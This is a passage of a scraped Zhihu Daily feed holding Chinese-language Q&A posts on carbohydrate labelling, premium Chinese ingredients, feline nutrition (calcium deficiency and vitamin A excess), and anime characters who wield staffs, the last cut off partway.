DP≥3，不能被人小肠内消化酶水解，并对身体有健康意义的多糖」</strong>。实际应用上，大部分前面提到的「不可利用碳水」都能归入「膳食纤维」大类。比如纤维素、食品胶体、抗性淀粉等，都算是「膳食纤维」<sup>[2]</sup>。</p>\n<p>膳食纤维不是「绝对不供能」，因为有些膳食纤维会被肠道菌群利用，代谢为短链脂肪酸，通过结肠吸收到体内为身体提供能量。</p>\n<p>膳食纤维对人体肠道正常功能有益，《中国居民膳食指南》中建议每天摄入 25~30g，可以通过多吃蔬菜水果、全谷物食物来实现这一点。</p>\n<p><strong>「碳水化合物」包不包括膳食纤维？</strong></p>\n<p>广义的「碳水化合物」是包括膳食纤维的。但在营养学实践中，很多时候提到「碳水化合物对人体的影响」或是在讨论「碳水化合物摄入量」时，我们指的都是「可利用碳水化合物」，不包括膳食纤维。目前大多数国家的营养成分表也会将「膳食纤维」和「碳水化合物」作为并列项，而并不认为膳食纤维属于碳水化合物。</p>\n<hr>\n<p><strong><strong>5. 营养成分表中对于碳水化合物是如何标示的？</strong></strong></p>\n<p>看了刚才的介绍，你可能要问了，那我在超市里看到一个食物的「碳水化合物」含量是 10g/100g，这到底是什么意思？这里刚才介绍的哪个概念？</p>\n<p><strong>我想说，目前，中国的营养成分表法规对于碳水化合物的标示是非常混乱的</strong><sup>[3]</sup><sup>[4]</sup><strong>——</strong></p>\n<ul>\n<li>\n<strong>根据 GB 28050 的规定，营养成分表中的「碳水化合物」可以是「总碳水化合物」，也可以是「可利用碳水化合物」，怎么标完全由商家自己决定。</strong>（这造成了同样一种食物，不同牌子碳水相差极大，但实际上只是计算方式不同）</li>\n<li>\n<strong>碳水化合物的子项中可以有「糖」，也可以没有「糖」。同样是商家自己决定</strong><sup>[5]</sup><strong>。</strong>（高糖食物的标示在这里有很大操作空间）</li>\n<li><strong>营养成分表中可以有「膳食纤维」，也可以没有「膳食纤维」。</strong></li>\n<li>\n<strong>如果有「膳食纤维」项，「碳水化合物」含量可以包括膳食纤维，也可以不包括膳食纤维。</strong>（所以膳食纤维到底是单列项还是碳水化合物的子项？我表示很晕。）</li>\n</ul>\n<p>我强烈反对这种混乱的标识，因为它完全无法让消费者正确认识碳水化合物，只会引起消费者各种困惑。监管部门应该明确「碳水化合物」、「糖」、「膳食纤维」这三者的定义，至少做到让营养成分表没有歧义。</p>\n<hr>\n<p><strong>6. 什么是「精制碳水」？</strong></p>\n<p>前面我们介绍的所有概念，都对应微观层面某种特定的<strong>食物成分</strong>，是特定的分子。</p>\n<p>当我们说到「精制碳水」时，指的是一大类<strong>食物本身</strong>，而不是食物成分。「精制碳水」这个概念提出是为了指导我们日常饮食的。<strong>通常指的就是精加工的米面类主食（精米、白面、米粉等以及以它们为主要原料加工出来的食物）。</strong></p>\n<p>如果从微观层面分析，这类食物的成分会很复杂，包括碳水化合物，蛋白质，维生素，矿物质等等组分，其中碳水化合物这块，既有可利用的，也有不可利用的。</p>\n<p>跟「精制碳水」对应的概念是「全谷物食品」，指的是没有精细化加工，或者虽然经过加工但保留了完整谷粒营养成分的谷物加工成的食物。比如糙米饭，全麦面包等。</p>\n<p>全谷物保留了谷物中更多的营养，包括维生素、矿物质、必需脂肪酸等。《中国居民膳食指南》建议每天碳水化合物的供能比是 50%~65%，其中全谷物食品建议占比 1/4~1/3。</p>\n<hr>\n<p><strong><strong>7. 回答题主的问题：为什么说西瓜含糖量高？</strong></strong></p>\n<p>我查到的数据（USDA 数据库），西瓜总碳水含量 8% 左右，其中糖含量为 6%，膳食纤维含量为 0.4%。在所有水果中，这些值都是偏低的，主要是因为……西瓜水多。</p>\n<p>所以西瓜含糖量在所有水果中并不高。题主假设错误。适量吃一些西瓜对身体还是有好处的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-338d483d9813e2f283d50b57c38e1064_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/299392664\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738835"},{"title":"有哪些产地在中国的顶级食材？","date":"2021-08-03 23:06:47","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-094919591b80ff565b578edeeaa94c5f_l.jpg?source=8673f162\"><span>娄大.Fresh，</span><span>新农业丨修炼有趣灵魂</span>\n<a href=\"https://www.zhihu.com/question/304397817/answer/552366523\" hidden>阅读原文</a>\n</div>\n<div>\n<p>很多人觉得进口才是高端，殊不知国内食材也有很多高端的。</p>\n<p>“顶级”食材，有的源于数量稀少，有的源于价格高昂，有的纯属口感爆炸，总之除了好吃以外兼具了很多其它属性～～</p>\n<p>1.黄唇鱼</p>\n<p>鱼膘珍贵，贵如黄金！有特殊医用价值，被美国知名媒体评为全球“顶级”9 种食材之一。市面上黄唇鱼干膘（白花胶）500g 售价 10 万以上。</p>\n<p>黄唇鱼是国家二级珍稀保护动物，野生黄唇鱼禁止私自买卖。大个的黄唇鱼都能拍出天价。现在还在攻坚人工繁殖阶段～</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-969ff159ec13ccce71d79716efe8b42d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>2.亚东鲑鱼</p>\n<p>青藏高原稀有鱼种，主要以水生昆虫，甲壳动物为食，肉质极其鲜美，原来野生亚东鲑也是国家二级保护物种。亚东县政府从生态保护，人工培育和市场推广相结合，走出了一条特色产业之路。现在亚东鲑鱼已经走出了保护物种之列。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-490eaa360e6aa33b8d8355690fc44177_720w.jpg?source=8673f162\" alt=\"\"></figure><p>3.长江刀鱼</p>\n<p>这个大家可能听的比较多。与河豚，鲥鱼和鮰鱼一起誉为“长江四鲜”。</p>\n<p>物以稀为贵，曾几何时野生长江刀鱼的价格一斤几千元是很常见的。现在已经有人工养殖的发展，相信未来可以走进百姓餐桌。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ec289823755cfe839bef1de73f4e42bc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>4.乌鱼子</p>\n<p>盛产于台湾省，是雌乌鱼的卵巢和卵。富含蛋白质和脂类，营养价值很高。</p>\n<p>乌鱼子的料理方法很多，油炸，香烤，酒煮，酒烧，甚至炒饭都可以～舌尖中国也推荐过哟。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6c929a5b11e5c596048d3ce4ee34d3ca_720w.jpg?source=8673f162\" alt=\"\"></figure><p>5.雪蛤</p>\n<p>这叫做东北林蛙，相信这个名字就不陌生了。生长在中国东北林区的一种珍贵蛙种。明清时期宫廷贡品，有“软黄金”、“动物人参”的美誉。</p>\n<p>林蛙中最精华是雌蛙输卵管——林蛙油，也叫雪蛤油、雪蛤膏。其常见吃法木瓜炖雪蛤（粤菜甜点），雪蛤银耳羹。炖好的雪蛤香甜甘滑。价格昂贵。</p>\n<p>6.河豚</p>\n<p>提到河豚大家第一反应便是日本，其实中国吃河豚很早的。河豚有毒需要特殊料理，做河豚的厨师得有专门的资格证，一般你去饭店点河豚，有些都会先让厨师上来当面试吃，颇有意思。</p>\n<p>现在养殖的河豚价格已经不再昂贵，但并不能阻止它依旧美味出天际。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2e9540ab962fab19b26c86f42c5335e8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>7.黄油蟹</p>\n<p>前身是膏蟹，属青蟹雌性，外表无异于膏蟹。不同之处，蒸熟以后介于红色和黄色之间，蟹盖蟹爪关节处均可见黄色油脂。</p>\n<p>黄油蟹是粤港澳地区新兴食用的名贵蟹种，有“蟹中之王”的美誉。</p>\n<p>优质野生黄油蟹价格昂贵，因为膏蟹变种，数量稀少。一般百十只膏蟹才能产出 1 只野生黄油蟹。存活期较短，一般农历 5 月下旬到中秋节前。现在市面上流通的，大部分是人工饲养的仿野生黄油蟹。</p>\n<p>优质头手黄油蟹能卖到一两千一只。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-a075f8873d38935f9320b3250d1df9ec_720w.jpg?source=8673f162\" alt=\"\"></figure><p>8.松茸</p>\n<p>松茸是名贵食用菌类，有被誉为“菌中之王”，我国二级濒危保护物种。松茸秋季的 8 月上旬到 10 月中旬采集、食用。有特别的浓香，口感如鲍鱼，极润滑爽口。</p>\n<p>全球松茸产量逐年递减，国内松茸的主产区是四川和云南，鲜松茸平均年产量 2000 余吨，除去老茸、幼茸、残茸，优质松茸 1000 余吨。为什么国内松茸热度相对国外要低，主要一是国内对于松茸的普及认知度相对比较低；二是，松茸的口感并不是中餐主流烹饪追捧的味道。但是松茸的昂贵和珍稀，真的不只是吹嘘这么简单，营养价值确实高。松茸的价格一般是尺寸和品相决定，说实话，现在产量这么低，如果国人追捧松茸，估计就没有其他人什么事了。</p>\n<p>中国是松茸的主要出口国大国，日本是松茸消费大国，国内优质鲜松茸以出口为主。现在国内市场大量流通的并不是传统意义上的松茸，很多是变种或不同品种菌类。松茸本身有特殊清香气味，而一些变种和相似品类大多有比较刺激的味道。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2fc6b9d6bcd20295eb3c655ab2aab50b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>9.藏香猪</p>\n<p>原产于川西高原、云南、西藏、甘肃和岷县的古老品种。西藏原始的瘦肉型猪种，外牧养类。</p>\n<p>肉品中氨基酸含量高，微量元素含量高，脂肪低，猪肠长，猪皮薄，鬃毛长。</p>\n<p>藏香猪属于放牧型猪种，生长在海拔 3000-4000 米高原地带。优质藏香猪以野生可食性植物和果实为主食。成年猪体重不足 50 公斤。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d9cbd5faae441f32378151c7fd5c950d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>10.老鹅头</p>\n<p>有朋友说鹅头有什么稀奇的。咦，你还真别说。一个三斤半重的老鹅头往往要卖到千元以上。这种鹅头最初选用 4 年龄退役的种鹅来卤制。老鹅头普通人觉得很贵。消费的起的群体却觉得和白松露，干鲍等奢侈的食物相比，物超所值。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f16d46b3770e5a3e8a06215fe7e58a18_720w.jpg?source=8673f162\" alt=\"\"></figure><p>11.辽参</p>\n<p>传统美食“海八珍”之首，大名鼎鼎“佛跳墙”主料。辽参比关东参以及南参名气大，主要是辽渤海周边自然环境优越，辽参生长发育缓慢，极耐严寒低温，自然淘汰率极高，品质优秀。辽参中又以黑玉参为佳，黑玉参对水质要求严格，一般生长于无人居住野岛周边。每年冬天有长达 3 个月冰冻期，生长缓慢，大约四五年才能长成。</p>\n<p>辽参富含氨基酸，精氨酸，滋补佳品，烹饪口感也比较好～</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ae9f47999a66e7a92d6bdf514d89985a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>12.金箔（手动滑稽一下）</p>\n<p>金子可以吃，你是逗我吗？确实，古老的中国也有食用黄金的历史。远在秦汉时代，华夏富豪就有食用金箔、金粉的记载。现代，日本、东南亚也曾盛行一时。</p>\n<p>1983 年世界卫生组织食品添加剂法典委员会正式将 9999 自然纯金列入食品添加剂范畴编为 A 表第 310 号。</p>\n<p>南京的龙潭镇是世界金箔主要生产地之一。</p>\n<p>金箔的用途很广，可以添加在酒、糕点、蛋糕、咖啡、茶、火锅、料理、调味品、化妆品</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a6a60b0328e99a585c38e4eb4f5c969b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>中国地大物博，物产丰富。珍馐美味非常之多 ～</p>\n<p>有些食材攻克难关后推广人工种养殖，价格或许已经不再高昂，却依旧是很棒的存在，这是好事～后面有时间再补充。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/304397817\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738838"},{"title":"猫咪为什么不能只吃肉？","date":"2021-08-03 23:06:42","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-840db29afd8d6d69f33c3812f00e56b8_l.jpg?source=8673f162\"><span>王豆皮，</span><span>「动物行为学」爱好者｜兴趣是观察猫咪行为</span>\n<a href=\"https://www.zhihu.com/question/322598520/answer/2028594492\" hidden>阅读原文</a>\n</div>\n<div>\n<p>因为「<strong>肉</strong>」这个字是有歧义的。</p>\n<blockquote><strong>猫咪为什么不能只吃肉？</strong></blockquote>\n<p>造成这种疑惑的根源更像是个<strong>语言学</strong>问题，</p>\n<p>而非<strong>动物营养学</strong>问题。</p>\n<p>猫的确是纯粹的食肉动物，但猫在野外所捕食的「<strong>肉</strong>」和饲主在家中提供给猫的「<strong>肉</strong>」，往往有很大的不同。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c701fbfd975dc05e03c6307d3a9eaf78_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片由 Jason Leung 在 Unsplash 上发布）</figcaption></figure><p><strong><strong>一、什么是「肉」？——此肉非彼肉</strong></strong></p>\n<p>我们日常语境下所说的「肉」，通常指的是在现代食品生产中，去除骨后，动物的肌肉组织（瘦肉）、脂肪组织（肥肉）与结缔组织的结合体。</p>\n<p>在日常语境下，我们通常不会把动物的内脏等部位也称作「肉」；而是会将肝、肠等脏器称为「下水」<sup>[1]</sup>。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5f2581e284feda8ee558a1fbb2eb40c9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片由 Sebastian Coman Photography 在 Unsplash 上发布）</figcaption></figure><p>例如在生活中我们可能会说，鸡胸肉是肉、鸭腿肉是肉，而鸡心、鸡肝、鸭肠等则不是「肉」（虽然鸡心也包含肌肉组织<sup>[2]</sup>）。</p>\n<p>但其实从广义上讲，凡是可以作为食物加以利用的动物身体组织，都可以称之为「肉」<sup>[3]</sup><sup>[4]</sup><sup>[5]</sup>。</p>\n<p>而对猫来说，「食肉」则<strong>通常</strong>意味着吃下「<strong>一整只猎物</strong>」（煮硬的鱼刺除外）；比如一整只老鼠，是连骨带皮加上其他部位全部吃下，还可能包括猎物的肠道内容物<sup>[6]</sup>。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f621454ab93e35a1d1392ada0e40ed16_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片由 Kim Davies 在 Unsplash 上发布）</figcaption></figure><p>因此，如果将猫「食肉」狭义地理解为，猫只需要吃我们日常语境中的「肉」，即「动物的肌肉组织（瘦肉）、脂肪组织（肥肉）与结缔组织的结合体」，并以此为依据来喂猫的话。</p>\n<p>就<strong>多半要出大问题</strong>，轻则花掉大把医药费；重则可能让猫去世，饲主数年的养猫投入也将化作「沉没成本」，饲主将同时承受「<strong>心灵创伤</strong>」与「<strong>财产损失</strong>」的双重打击。</p>\n<p><strong>二、该来的钙没来，不该来的病就来</strong></p>\n<p>只喂「肉」，猫将无法摄入足量的各种矿物质和维生素。例如钙，钙是骨骼的关键组成部分，缺钙可能会导致猫的骨骼生长发育不良。</p>\n<p>进而可能导致猫出现<strong>佝偻病</strong>（rickets）、<strong>骨质软化症</strong>等问题<sup>[6]</sup>。</p>\n<p>如果只喂猫吃狭义上的「肉」〔动物的肌肉组织（瘦肉）、脂肪组织（肥肉）与结缔组织的结合体〕，同时又没有添加钙的话；当钙不足时，猫的骨骼发育过程就会受到阻碍，导致骨骼的形状异常、骨骼脆且易变形（常规饲喂下的猫很少会得佝偻病）<sup>[7]</sup>。</p>\n<p>引发猫佝偻病的重要原因之一，就是猫食物中的钙含量不足，同时还包括食物中钙和磷的比例不当等因素<sup>[7]</sup><sup>[8]</sup>【<strong>摄入过量的钙同样对猫有害</strong><sup>[9]</sup><sup>[10]</sup><strong>，请在兽医指导下进行补充</strong>】。</p>\n<p>患病初期可能看不出猫有多大变化，但随着病情发展，猫的食欲会逐渐减退，身形消瘦；活动量也随之减少，不愿登高，在高处时则害怕往下跳<sup>[11]</sup>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d525519b7f0db45234d8792ba7bc53c0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片由 NII 在 Unsplash 上发布）</figcaption></figure><p>严重的猫，会变得骨盆狭窄，导致排便困难<sup>[11]</sup>，甚至可能憋至去世。</p>\n<p>尽管动物的肌肉组织能给猫提供高品质的蛋白，但却无法提供猫所需的全价营养。</p>\n<p>喂肉虽好，但如果对「食肉」的认知有所偏差，就可能好心办了坏事。</p>\n<p><strong>三、鸡肝拌米饭：此一时彼一时</strong></p>\n<p>还有一种常见的「<strong>危险自制食谱</strong>」，</p>\n<p>就是<strong>鸡肝拌米饭</strong>。</p>\n<p>以前的乡村猫往往能自食其力，抓到一些蜥蜴、壁虎、昆虫、鸟类以及老鼠和兔子等猎物<sup>[6]</sup><sup>[12]</sup><sup>[13]</sup>；即便是猫出不去院子，通常也难免会有老鼠钻进院子来，毕竟我们以前养猫就是为了除鼠嘛。</p>\n<p>在那时的乡村，「鸡肝拌米饭」对猫来说，就相当于保障了每天基本的能量供应（以过去的生活条件，通常也不会给猫太多鸡肝），至于优质蛋白等营养物质就得靠猫自己了。</p>\n<p>而在今天的都市生活中，老鼠已不多见；且猫吃老鼠，还可能会感染弓形虫<sup>[14]</sup>，这对猫饲主来说，同样不是好事。如果将猫室外放养，任由其捕食鸟类，更是一种有损社会公德的养宠行为。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d54c9034a20a86ff7d6711a76ef463eb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片由 Sarah Dorweiler 在 Unsplash 上发布）</figcaption></figure><p>今天如果依然<strong>只用</strong>「鸡肝拌米饭」来喂猫，那就很容易出问题了。猫饲主所提供的食物，即是猫唯一的食物来源；如今鸡肝便宜又容易买到，即使用来喂猫，也可以放很多。</p>\n<p>鱼油、动物肝脏等食物，含有丰富的维生素 A<sup>[15]</sup><sup>[16]</sup><sup>[17]</sup>；在各类食品中，动物肝脏称得上是维生素 A 王者<sup>[18]</sup>。</p>\n<p>维生素 A 对动物机体具有多种功能，如维持视力、促进生长愈合，对免疫系统也有重要作用<sup>[15]</sup><sup>[17]</sup><sup>[9]</sup>。</p>\n<p>但摄入过量，就可能导致维生素 A 过度症（hypervitaminosis A）<sup>[19]</sup>。</p>\n<p><strong>维生素 A 过量</strong>可引起猫的骨损伤，关节出现严重骨刺，颈椎及部分关节僵硬；会让猫采食困难，无法梳理毛发而表现为被毛干燥；还可能出现迟钝、凸眼症、牙齿松脱等症状，进而严重影响猫的生存状况<sup>[19]</sup><sup>[20]</sup>。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/322598520\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738817"},{"title":"动漫里有哪些用长棍作为武器的人物?","date":"2021-08-03 23:06:33","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-77cc9f11afd55ac2951ba77857d93149_l.jpg?source=8673f162\"><span>枪骑士，</span><span>长枪、马槊、丈八矛</span>\n<a href=\"https://www.zhihu.com/question/474747035/answer/2030797520\" hidden>阅读原文</a>\n</div>\n<div>\n<p>很遗憾，因为<strong>棍棒</strong>的文化地位太低，逼格远远低于<strong>刀剑</strong>，所以使用<strong>长棍</strong>的动漫人物极少。即使有，大部分也跟<strong>“孙悟空”</strong>和<strong>“中国武术”</strong>有关。</p>\n<p>用长棍的人物大多是配角。而长棍主角，几乎全是<strong>孙悟空</strong>。</p>\n<p>大多数人对这个现象毫不在意，因为普罗大众对刀剑，永远不会<strong>审美疲劳</strong>。</p>\n<p><strong>我是动画党，很少看漫画，所以只说动画片。</strong></p>\n<p><strong>全文三千六百多字，图片超多，请耐心阅读，看完绝对不亏。</strong></p>\n<p><strong>首先是孙悟空三连</strong><strong>一、《大闹天宫》，1961 年</strong><strong>孙悟空（主角）</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bba6fdc89d350e6a95b6802c9ec82b2b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>二、《龙珠》TV 动画，1986 年</strong><strong>孙悟空（主角）</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-1cf23a0621832de178bb48568799c025_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>三、《西游记》动画版，1999 年</strong><strong>孙悟空（主角）</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-8210468bf4e9e788694b8522b526eecb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>四、《中华小子》，2007 年</strong><strong>陈小虎（主角）</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-cd3270e4ccb6d6a9a862b9d76ce95417_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-18e52f7b6991aae60466c9e1ed951ca5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>长棍可以变成三节棍</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-8016611233498fd6e2abee86841193ac_720w.jpg?source=8673f162\" alt=\"\"><figcaption>三个主角，全部是少林寺俗家弟子</figcaption></figure><p><strong>五、《兽神演武》TV 动画，2007 年</strong><strong>刘煌（配角）</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6e91931f90531b0eb668a7226827082b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>武曲星斗士</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-c48d62a378a6c1fad2fce31f1655e535_720w.jpg?source=8673f162\" alt=\"\"><figcaption>男主角是红衣少年——岱灯（破军），主要用拳法，偶尔用剑</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-c221a588bc735f30bb86c068fd9f4daf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>破军与贪狼</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-aea6b048be5ea85feae4ab515a38f325_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>六、《戚继光》，2014 年</strong><strong>俞大猷（配角）</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-78825c6fd4918bf040d054e4c1bec066_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-12a6888c3651b96fed4b2a558cc600ec_720w.jpg?source=8673f162\" alt=\"\"><figcaption>武举考试最后一关的 boss</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-f41bf264ed65ef4e4bf88ba71c1c310b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>戚继光。其实他最常用长枪，这里条件有限，只有刀</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-66fcaeddb09bb3800d431f4cad4e04c3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>戚继光用腰刀，被俞大猷吊打</figcaption></figure><p><strong>七、《剑风传奇》第二季，2016 年</strong><strong>艾桑（配角）</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-12cff691e989d9c6512bf93731d61887_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-6e774098fc7f52cb19d5c2139513946f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-cc9914ede7411faf5504538e9d129203_720w.jpg?source=8673f162\" alt=\"\"><figcaption>男主角格斯，使用门板巨剑</figcaption></figure><p>长杆武器里，<strong>枪矛</strong>的文化地位比<strong>棍棒</strong>高，所以文艺作品中使用枪矛的人物多一些。</p>\n<p>但是跟刀剑人物比，依然是少数。</p>\n<p><strong>因为在冷兵器中，刀剑类文化地位最高，最能装逼。</strong></p>\n<p>刀剑具备<strong>战斗、观赏、装逼、随身佩</strong>四合一的特性，十分讨喜。 以至于全世界，都有<strong>“刀剑崇拜”</strong>现象，所以刀剑的拥趸最多。</p>\n<p><strong>先看国内</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0c8b9d7965223871179dabe44ad18d79_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-204ea552573d0eebef1cc92eacd0c170_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-bd6d4e33b284f4eaee44e7e7038d19d7_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>再看国外</strong></p>\n<p><strong>日本的武士与刀、日式西幻。</strong></p>\n<p><strong>西方的骑士与剑、剑与魔法。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-29d54bf675e08dcab38bbeb0c5c565a0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-2d7bfe8aa30231871423cc7c95ca7d08_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-a96bdb43425a50551f0140502b995715_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0f25994af9acc669df9ca5de185159c3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d8290da368f61e11470c7ea13c6d1541_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-3cdc3f908923546e8895358c30db2f6e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然了，这里的<strong>“刀剑类”</strong>还要剔除<strong>“长杆刀”</strong>。至于原因嘛，你想想除了关羽和杨戬之外，文艺作品中还有几个用<strong>“长杆刀”</strong>的<strong>主角</strong>？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-825d72889c58a8ee3767e652a15921a7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>因为这种情况属于<strong>“兵器逼格不够，主人超级牛逼”</strong>。并且人物与兵器甚至绑定了，其他人难以复制。</p>\n<p>另一个使偃月刀的著名虚构角色，还是<strong>山寨版关羽——关胜</strong>。</p>\n<p>正因为<strong>青龙偃月刀（关刀）</strong>的特殊性，导致其他虚构角色使用偃月刀，仿佛都会处在<strong>关二爷的阴影之下</strong>。</p>\n<p>而另外一个用<strong>三尖两刃刀（二郎刀）</strong>的著名虚构角色，干脆就没有了。</p>\n<p><strong>偃月刀</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0fa29a8e6689b458d96fba569ffdb1d7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>伊朗古画中的蒙古武士</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-70f3d859e0c4161ce2ba530f402bb28c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>明代《出警入跸图》</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-2f2ec9a24a7bb0c8572bd88061a894a1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>朝鲜《武艺图谱通志》</figcaption></figure><p><strong>三尖两刃刀</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-55d9f51532bfdbe28fe65b26aaf7a05a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>三尖两刃刀，就是宋代“掉刀”的衍生款式</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-c48b7ea0ffcd29ac759fbabb4c8fba56_720w.jpg?source=8673f162\" alt=\"\"><figcaption>北宋《武经总要》刀八色。掉刀，有两刃、山字之制</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-1f8638c30ad0552bf96824edf1265bf6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>现代人推测，宋代掉刀就是唐代陌刀的后裔</figcaption></figure><p><strong>西洋单刀戟</strong></p>\n<p>欧洲也有类似偃月刀的武器，但是西洋人从来不给<strong>英雄人物</strong>和<strong>主角</strong>配这个。</p>\n<p>因为没有文艺作品宣传，所以很少有人知道这种西洋冷兵器。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-1956d7d50c145716ea3573eb584a7099_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8a6b0b12d6839b09501f6ffe22683fee_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-3854107635bb3043dbd82233fc7b5c7a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>日本游戏《黑暗之魂》，倒是给一种<strong>精英怪</strong>配了西洋单刀戟。</p>\n<p>很多中国玩家，都以为这是<strong>偃月刀 / 关刀</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0d06ccca631cde76939127053b412bbe_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《黑暗之魂》黑骑士——精英怪</figcaption></figure><p>而我们中国，是给<strong>“武圣”</strong>配了青龙偃月刀。这种长杆大刀，因关羽而出名。</p>\n<p>如意金箍棒和三尖两刃刀也差不多，一个靠<strong>齐天大圣</strong>出名，另一个靠<strong>二郎神</strong>出名。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-76565fd81e16f4e35b10f643961f4c7d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《真三国无双 3》关羽——武圣</figcaption></figure><p>中国<strong>传统通俗文化</strong>里，使用长杆武器的主角还是挺多的。</p>\n<p>我国有全球最多的，使用长杆武器的<strong>英雄人物</strong>和<strong>虚构角色</strong>。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-fa620c905d56e088153e4f35cc60f090_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8d45f1077527b82a1b4d6218da519d9f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>宇文成都——凤翅镏金镋</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-1626ad596c3da18e8d783c8d3987be30_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-810031f80b363e04bb03dfba0aa47b77_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img 